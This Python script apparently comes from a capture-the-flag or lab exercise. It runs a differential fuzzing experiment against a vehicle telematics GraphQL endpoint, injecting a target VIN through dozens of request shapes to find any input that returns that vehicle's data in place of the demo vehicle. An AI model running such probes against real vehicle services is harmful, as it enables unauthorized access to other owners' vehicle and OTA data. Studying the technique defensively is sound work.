"""E1: TSP /graphql 响应差分实验。
判据：若某请求的 (status, body) 与 baseline 不同 => 该输入被服务端消费（有信息量）。
若全部相同 => 服务端完全忽略该输入维度。
"""
import json, hashlib, time, sys, urllib.request, urllib.error, urllib.parse

BASE = "http://10.230.164.2:8080/graphql"
VIN_REAL = "CV6FF52FEE9EDDD86"
VIN_DEMO = "CV6000000DEMO0001"
BASELINE_BODY = b'{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

def req(label, body=None, headers=None, method="POST", url=BASE):
    h = dict(headers or {})
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else body.encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            code, rb, rh = resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        code, rb, rh = e.code, e.read(), dict(e.headers)
    except Exception as e:
        return {"label": label, "error": str(e)}
    return {"label": label, "status": code, "len": len(rb), "sha": hashlib.sha256(rb).hexdigest()[:16],
            "body": rb.decode("utf-8", "replace")[:400], "ms": round((time.time()-t0)*1000),
            "ct": rh.get("Content-Type"), "setcookie": rh.get("Set-Cookie"),
            "req_body": (data.decode("utf-8","replace") if data else None),
            "req_url": url, "req_headers": {k:v for k,v in h.items()}}

cases = []
def add(label, **kw): cases.append((label, kw))

# --- A: JSON 形状类（探解码目标类型：struct / interface{} / 需要特定字段）
add("A01_num_1", body="1")
add("A02_str_x", body='"x"')
add("A03_array", body="[]")
add("A04_null", body="null")
add("A05_true", body="true")
add("A06_empty_obj", body="{}")
add("A07_bad_query_syntax", body='{"query":"!!! not graphql ("}')
add("A08_query_obj", body='{"query":{"vin":"%s"}}' % VIN_REAL)
add("A09_query_num", body='{"query":123}')
add("A10_query_array", body='{"query":["%s"]}' % VIN_REAL)
add("A11_no_body", body=None)

# --- B: GraphQL 变量通道
Q_VAR = 'query V($vin:String!){vehicles(vin:$vin){vin label}}'
for key in ["vin", "id", "vehicleId", "v"]:
    add(f"B_var_{key}", body=json.dumps({"query": Q_VAR, "variables": {key: VIN_REAL}}))
add("B_var_full", body=json.dumps({"query": Q_VAR, "variables": {"vin": VIN_REAL, "id": VIN_REAL}}))
add("B_var_strvariables", body=json.dumps({"query": Q_VAR, "variables": json.dumps({"vin": VIN_REAL})}))
add("B_extensions", body=json.dumps({"query": "{vehicles{vin}}", "extensions": {"vin": VIN_REAL}}))

# --- C: URL 查询参数通道
for p in ["vin", "vehicleId", "id", "token", "query", "v"]:
    val = ('{' + 'vehicles(vin:"%s"){vin}' % VIN_REAL) if p == "query" else VIN_REAL
    add(f"C_qs_{p}", body='{"query":"{vehicles{vin}}"}', url=BASE + "?" + p + "=" + urllib.parse.quote(val))

# --- D: 嵌套容器里的 vin
for nest in ["data", "input", "args", "params", "filter", "where", "vehicle", "auth", "context", "meta"]:
    add(f"D_nest_{nest}", body=json.dumps({"query": '{vehicles{vin}}', nest: {"vin": VIN_REAL}}))
    add(f"D_nestflat_{nest}", body=json.dumps({"query": '{vehicles{vin}}', nest + "Vin": VIN_REAL}))

# --- E: 大小写 / 重复键 / 多类型
add("E01_VIN_upper", body='{"VIN":"%s","query":"{vehicles{vin}}"}' % VIN_REAL)
add("E02_Vin_mixed", body='{"Vin":"%s","query":"{vehicles{vin}}"}' % VIN_REAL)
add("E03_dupkey", body='{"vin":"%s","vin":"%s","query":"{vehicles{vin}}"}' % (VIN_DEMO, VIN_REAL))
add("E04_vin_num", body='{"vin":1,"query":"{vehicles{vin}}"}')
add("E05_vin_list", body='{"vin":["%s"],"query":"{vehicles(vin:[\\"%s\\"]){vin}}"}' % (VIN_REAL, VIN_REAL))

# --- F: 只把 VIN 放进 query 文本（各种语法）
for q, lbl in [
    ('{vehicles(vin:"%s"){vin label}}' % VIN_REAL, "F01_arg_vin"),
    ('{vehicles(vin:%s){vin label}}' % VIN_REAL, "F02_arg_raw"),
    ('{vehicles(filter:{vin:"%s"}){vin label}}' % VIN_REAL, "F03_filter_obj"),
    ('{vehicle(vin:"%s"){vin label ota{campaigns{id}}}}' % VIN_REAL, "F04_ota_nested"),
    ('{vehiclesByVin(vin:"%s"){vin}}' % VIN_REAL, "F05_byVin"),
]:
    add(lbl, body=json.dumps({"query": q}))

results = [req(l, **kw) for l, kw in cases]
base_sha = None
for r in results:
    if r.get("label") == "A06_empty_obj":
        base_sha = r.get("sha")
diffs = [r for r in results if r.get("sha") != base_sha or r.get("status") != 200]
print(f"total={len(results)} baseline_sha={base_sha} diffs={len(diffs)}")
for r in results:
    tag = "DIFF" if (r in diffs) else "same"
    print(f"{tag:4} {r['label']:24} status={r.get('status')} len={r.get('len')} ms={r.get('ms')} body={(r.get('body') or '').strip()[:160]}")
json.dump({"baseline_sha": base_sha, "results": results}, open(r"D:\qwb\03_EVIDENCE\tsp\0200_e1_differential.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
